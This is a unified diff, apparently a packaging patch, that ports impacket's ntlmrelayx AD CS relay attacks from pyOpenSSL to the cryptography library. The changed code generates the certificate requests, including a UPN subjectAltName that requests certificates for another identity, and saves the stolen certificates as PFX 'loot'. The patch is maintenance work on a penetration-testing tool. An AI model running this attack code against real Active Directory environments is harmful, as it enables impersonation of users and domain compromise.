@@ -1,0 +1,129 @@
+Patch-Source: not yet submitted upstream, to be offered on
+https://github.com/fortra/impacket/issues/2248 (open, no fix or PR yet)
+
+pyOpenSSL 26.4.0 removed X509Req, X509Extension and dump_certificate_request,
+so ntlmrelayx' AD CS attacks (--adcs over HTTP enrolment and over ICPR/RPC)
+abort with AttributeError.  Build the CSR with cryptography instead.
+
+The szOID_NTDS_CA_SECURITY_EXT otherName value is DER-encoded with pyasn1
+(already an impacket dependency); the resulting extension is byte-identical
+to what OpenSSL produced for
+"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:<upn>".
+
+--- a/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py
++++ b/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py
+@@ -18,15 +18,19 @@
+ import re
+ import base64
+ import os
+-from OpenSSL import crypto
+ import urllib.parse
+ 
+ from cryptography import x509
++from cryptography.hazmat.primitives import hashes
++from cryptography.hazmat.primitives.asymmetric import rsa
+ from cryptography.hazmat.primitives.serialization import pkcs12
++from cryptography.hazmat.primitives.serialization import Encoding
+ from cryptography.hazmat.primitives.serialization import NoEncryption
+ from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
+ from cryptography.x509.oid import NameOID, ObjectIdentifier
+ from cryptography.hazmat.backends import default_backend
++from pyasn1.codec.der.encoder import encode as der_encode
++from pyasn1.type.char import UTF8String
+ 
+ 
+ 
+@@ -40,8 +44,7 @@
+     UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
+ 
+     def _run(self):
+-        key = crypto.PKey()
+-        key.generate_key(crypto.TYPE_RSA, 4096)
++        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+ 
+         if self.username in ELEVATED:
+             LOG.info('Skipping user %s since attack was already performed' % self.username)
+@@ -99,7 +102,7 @@
+ 
+         cert_obj = load_pem_x509_certificate(certificate.encode(), backend=default_backend())
+         pfx_filename = self._sanitize_filename(self.username or self._extract_certificate_identity(cert_obj) or "certificate_{0}".format(certificate_id))
+-        certificate_store = self.generate_pfx(key.to_cryptography_key(), cert_obj)
++        certificate_store = self.generate_pfx(key, cert_obj)
+         output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
+         LOG.info("Writing PKCS#12 certificate to %s" % output_path)
+         try:
+@@ -117,20 +120,25 @@
+             LOG.info("This certificate can also be used for user : {}".format(self.config.altName))
+ 
+     @staticmethod
+-    def generate_csr(key, CN, altName, csr_type = crypto.FILETYPE_PEM):
++    def generate_csr(key, CN, altName, csr_type = Encoding.PEM):
+         LOG.info("Generating CSR...")
+-        req = crypto.X509Req()
++        req = x509.CertificateSigningRequestBuilder()
+ 
++        subject = []
+         if CN:
+-            req.get_subject().CN = CN
++            subject.append(x509.NameAttribute(NameOID.COMMON_NAME, CN))
++        req = req.subject_name(x509.Name(subject))
+ 
+         if altName:
+-            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])
++            req = req.add_extension(
++                x509.SubjectAlternativeName([
++                    x509.OtherName(ADCSAttack.UPN_OID,
++                                   der_encode(UTF8String(altName)))
++                ]),
++                critical=False
++            )
+ 
+-        req.set_pubkey(key)
+-        req.sign(key, "sha256")
+-
+-        return crypto.dump_certificate_request(csr_type, req)
++        return req.sign(key, hashes.SHA256()).public_bytes(csr_type)
+ 
+     @staticmethod
+     def generate_pfx(key, certificate):
+
+--- a/impacket/examples/ntlmrelayx/attacks/rpcattack.py
++++ b/impacket/examples/ntlmrelayx/attacks/rpcattack.py
+@@ -19,7 +19,8 @@
+ import string
+ import random
+ 
+-from OpenSSL import crypto
++from cryptography.hazmat.primitives.asymmetric import rsa
++from cryptography.hazmat.primitives.serialization import Encoding
+ from cryptography.x509 import load_der_x509_certificate
+ from cryptography.hazmat.backends import default_backend
+ 
+@@ -123,8 +124,7 @@
+ 
+ class ICPRRPCAttack:
+     def _run(self):
+-        key = crypto.PKey()
+-        key.generate_key(crypto.TYPE_RSA, 4096)
++        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+ 
+         if self.username in ELEVATED:
+             LOG.info('Skipping user %s since attack was already performed' % self.username)
+@@ -136,7 +136,7 @@
+ 
+         LOG.debug("Generating a CSR for user %s and template %s" % (self.username, current_template))
+ 
+-        csr = ADCSAttack.generate_csr(key, self.username, self.config.altName, crypto.FILETYPE_ASN1)
++        csr = ADCSAttack.generate_csr(key, self.username, self.config.altName, Encoding.DER)
+         LOG.info("CSR generated!")
+ 
+         attributes = ["CertificateTemplate:%s" % current_template]
+@@ -160,7 +160,7 @@
+ 
+         cert_obj = load_der_x509_certificate(certificate, backend=default_backend())
+         pfx_filename = ADCSAttack._sanitize_filename(self.username or ADCSAttack._extract_certificate_identity(cert_obj) or "certificate")
+-        certificate_store = ADCSAttack.generate_pfx(key.to_cryptography_key(), cert_obj)
++        certificate_store = ADCSAttack.generate_pfx(key, cert_obj)
+         output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
+         LOG.info("Writing PKCS#12 certificate to %s" % output_path)
+         try:
